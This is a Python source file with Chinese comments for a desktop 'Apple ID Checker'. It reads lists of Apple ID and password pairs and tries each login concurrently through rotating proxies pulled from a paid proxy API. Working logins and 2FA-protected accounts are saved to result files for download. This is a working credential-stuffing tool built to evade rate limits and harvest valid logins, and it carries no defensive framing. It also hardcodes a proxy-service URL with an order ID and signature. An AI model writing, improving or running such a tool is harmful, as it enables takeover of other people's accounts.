import webview  # 导入webview创建GUI应用
import requests  # 导入requests处理HTTP请求
import threading  # 导入threading模块进行线程管理
import queue  # 导入queue模块提供线程安全的队列
import concurrent.futures  # 导入concurrent.futures支持并发执行
import logging  # 导入logging模块进行日志记录
# 从apple_id_checker模块导入AppleIDChecker类
from apple_id_checker import AppleIDChecker
from threading import Lock, Event  # 导入Lock和Event用于线程同步
from concurrent.futures import ThreadPoolExecutor  # 导入ThreadPoolExecutor执行线程池管理
import tempfile  # 导入tempfile处理临时文件
import os  # 导入os模块处理文件和目录
import time  # 导入time模块处理时间


# 初始化结果文件路径变量
result_file_path = None

# 配置日志记录器，设置日志级别为INFO
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

# 定义常量：代理API的URL和每次获取代理的数量
PROXY_API_URL = 'https://api.hailiangip.com:8522/api/getIp?type=1&num=200&pid=-1&unbindTime=180&cid=-1&orderId=O23110722352356692123&time=1699738697&sign=4bc1e1ba75c91b0da7d6328552104498&noDuplicate=1&dataType=1&lineSeparator=0'
NUM_PROXIES_TO_FETCH = 300

# 初始化代理队列和线程同步对象
proxy_queue = queue.Queue()
proxy_queue_lock = Lock()
stop_event = Event()



# 定义线程安全的代理队列填充函数
def replenish_proxy_queue_thread_safe(NUM_PROXIES_TO_FETCH):
    # 当代理数量小于200时，重新填充代理队列
    while not stop_event.is_set():  # 循环直到外部事件触发停止
        with proxy_queue_lock:  # 锁定代理队列进行操作
            # 如果代理数量少于200，则填充代理队列
            if proxy_queue.qsize() < NUM_PROXIES_TO_FETCH:
                logger.info("Replenishing proxy queue...")
                try:
                    response = requests.get(PROXY_API_URL)
                    proxies = response.text.strip().split('\n')
                    for proxy in proxies:
                        proxy_queue.put(proxy)
                        # print(proxy)
                    logger.info("Added new proxies to the queue. count: " + str(proxy_queue.qsize()))
                except Exception as e:
                    logger.error(f"Failed to fetch new proxies: {e}")
        time.sleep(10)  # 每10秒检查一次队列大小


# 使其只负责获取代理并填充到队列中，不在这个函数内部进行数量检查
def fetch_and_replenish_proxy_queue():
    try:
        response = requests.get(PROXY_API_URL)
        proxies = response.text.strip().split('\n')
        for proxy in proxies:
            proxy_queue.put(proxy)
        logger.info("Added new proxies to the queue.")
    except Exception as e:
        logger.error(f"Error fetching proxies: {e}")


# 用于文件写入的全局锁
write_results_lock = threading.Lock()

# 初始化结果文件路径变量
result_file_path_correct = None
result_file_path_2fa = None

# 定义写入检测结果到文件的函数
def write_result_to_file(apple_id, password, status):
    global result_file_path_correct, result_file_path_2fa

    if status == "密码正确":
        if result_file_path_correct is None:
            temp_file = tempfile.NamedTemporaryFile(delete=False, mode='w', suffix='.txt', prefix='results_correct_', dir='.')
            result_file_path_correct = temp_file.name
            temp_file.close()
        file_path = result_file_path_correct

    elif status == "双重认证":
        if result_file_path_2fa is None:
            temp_file = tempfile.NamedTemporaryFile(delete=False, mode='w', suffix='.txt', prefix='results_2fa_', dir='.')
            result_file_path_2fa = temp_file.name
            temp_file.close()
        file_path = result_file_path_2fa

    else:
        return

    with write_results_lock:
        with open(file_path, 'a') as file:
            file.write(f"{apple_id}----{password}---{status}\n")


# 定义使用代理检查Apple ID的函数
def check_apple_id(apple_id, password):
    checker = AppleIDChecker()  # 创建AppleIDChecker实例
    while not stop_event.is_set():  # 循环直到外部事件触发停止
        proxy = None
        try:
            proxy = proxy_queue.get(timeout=10)  # 从队列获取代理，设置超时
            # 使用获取的代理检查Apple ID
            result = checker.try_login(apple_id, password, proxy)
            write_result_to_file(apple_id, password, result['status'])  # 实时写入检查结果
            return result  # 返回检查结果
            # return {'apple_id': apple_id, 'password': password, 'status': result['status']}

        except queue.Empty:  # 捕获队列空异常，队列为空则等待并再次尝试
            logger.warning("Proxy queue is empty. Waiting for proxies...")
            # 在此不需要break，因为get操作已经包含了超时重试逻辑

        except Exception as e:  # 捕获其他异常，记录错误并继续尝试下一个代理
            logger.error(f"Error checking {apple_id} with proxy {proxy}: {e}")
            # 在此可以选择是否要跳出循环或继续尝试，取决于您的具体需求
            # 如果选择继续，则不需要break语句；如果要跳出，则需要添加break
            # 此示例代码选择继续尝试下一个代理
            continue  # 继续下一轮循环

    # 如果接收到停止信号，则记录信息并退出函数
    logger.info(f"Thread {threading.current_thread().name} received stop signal for {apple_id}")


global_window = None  # 声明全局变量global_window


class Api:
    def __init__(self):
        self.checker = AppleIDChecker()  # 实例化Apple ID检查器
        self.is_checking = False  # 初始化检查状态标志

    def start_proxy_maintenance(self):
        # 启动一个线程来维护代理队列
        maintenance_thread = threading.Thread(target=replenish_proxy_queue_thread_safe, args=(NUM_PROXIES_TO_FETCH,))
        maintenance_thread.start()

    def set_proxy_api(self, proxy_api_url):
        # 设置代理API的URL
        global PROXY_API_URL  # 声明全局变量
        PROXY_API_URL = proxy_api_url  # 设置代理API的新URL
        self.start_proxy_maintenance()  # 重新启动代理维护线程

    def get_results_file_path(self):
        # 返回结果文件的路径，如果文件存在
        global result_file_path_correct
        return result_file_path_correct if result_file_path_correct and os.path.exists(result_file_path_correct) else ''

    # 用于响应前端请求，触发保存文件对话框并保存结果文件
    def download_file(self):
        global result_file_path_correct  # 使用全局变量获取结果文件路径
        try:
            # 如果结果文件存在，使用webview弹出保存对话框
            if result_file_path_correct and os.path.exists(result_file_path_correct):
                save_dialog = webview.windows[0].create_file_dialog(webview.SAVE_DIALOG, directory=os.path.dirname(
                    result_file_path_correct), save_filename=os.path.basename(result_file_path_correct))
                if save_dialog:
                    # 读取临时结果文件并将其内容保存到用户指定的位置
                    with open(result_file_path_correct, 'r') as source, open(save_dialog, 'w') as target:
                        target.write(source.read())
                    return 'File saved successfully to ' + save_dialog
                else:
                    return 'File save cancelled by the user.'
            else:
                return 'No result file found. Please run the checks first.'
        except Exception as e:
            # 如果在保存过程中发生异常，记录异常信息并返回错误消息
            logger.exception("Failed to save the file.")
            return f"An error occurred while saving the file: {str(e)}"

    def stop_checking(self):
        # 设置停止事件，通知所有检查线程停止当前操作
        logger.info("Stopping all threads...")
        stop_event.set()

    # 用于开始执行Apple ID的检查操作
    def check_apple_ids(self, file_content, num_threads):
        if self.is_checking:  # 如果正在检查中，则不执行新的检查请求
            logger.info("Currently checking. Please wait until the current check is completed.")
            return

        self.is_checking = True  # 标记为正在检查

        # 解析文件内容为Apple ID和密码对，准备检查
        apple_ids = [line.split(
            '----') for line in file_content.strip().split('\n') if '----' in line]

        # 创建一个线程池，并为每对Apple ID和密码分配一个线程进行检查


        with ThreadPoolExecutor(max_workers=num_threads) as executor:
            # 提交检查任务到线程池
            future_to_apple_id = {executor.submit(
                check_apple_id, apple_id, password): (apple_id, password) for apple_id, password in apple_ids}

            # 初始化统计数据
            results = {"correct": 0, "2fa": 0, "incorrect": 0, "exception": 0,
                    "total": len(apple_ids), "detected": 0, "undetected": 0}

            # 处理每个线程的执行结果
            for future in concurrent.futures.as_completed(future_to_apple_id):
                apple_id, password = future_to_apple_id[future]
                try:
                    result = future.result()
                    # 根据返回的结果更新统计数据
                    status = result['status']
                    if status == "密码正确":
                        results["correct"] += 1
                    elif status == "双重认证":
                        results["2fa"] += 1
                    elif status == "密码错误":
                        results["incorrect"] += 1
                    else:
                        results["exception"] += 1
                    results["detected"] += 1
                    results["undetected"] = results["total"] - results["detected"]

                    # 线程安全地更新UI
                    update_ui_with_results(results)
                except Exception as exc:
                    logger.error(f'Apple ID check for {apple_id} generated an exception: {exc}')
                    results["exception"] += 1
                    results["undetected"] = results["total"] - results["detected"]
                    update_ui_with_results(results)

        self.is_checking = False  # 检查结束后，重置检查状态标志
        logger.info("All Apple ID checks are completed.")


# 安全地在主线程中更新UI的函数定义
def update_ui_with_results(results):
    # 构建JavaScript代码来更新前端页面的统计数据
    update_ui_script = f"""
        document.getElementById('correct-count').innerText = '{results['correct']}';
        document.getElementById('2fa-count').innerText = '{results['2fa']}';
        document.getElementById('incorrect-count').innerText = '{results['incorrect']}';
        document.getElementById('exception-count').innerText = '{results['exception']}';
        document.getElementById('total-count').innerText = '{results['total']}';
        document.getElementById('detected-count').innerText = '{results['detected']}';
        document.getElementById('undetected-count').innerText = '{results['undetected']}';
    """
    # 执行JavaScript代码，更新前端显示的统计数据
    global_window.evaluate_js(update_ui_script)

# 创建webview窗口并启动程序的函数定义


def create_webview_window():
    global global_window  # 声明修改全局变量global_window
    api = Api()  # 创建Api类实例
    api.start_proxy_maintenance()  # 启动代理维护线程
    # 创建webview窗口，设置窗口标题、加载的html文件、绑定的js_api对象、窗口大小等属性
    global_window = webview.create_window(
        'Apple ID Checker', 'index.html', js_api=api, width=800, height=500, resizable=False, min_size=(800, 500))
    webview.start()  # 启动webview，使用CEF作为后端gui='cef'


# 程序入口点
if __name__ == '__main__':
    create_webview_window()  # 调用创建窗口的函数，运行程序
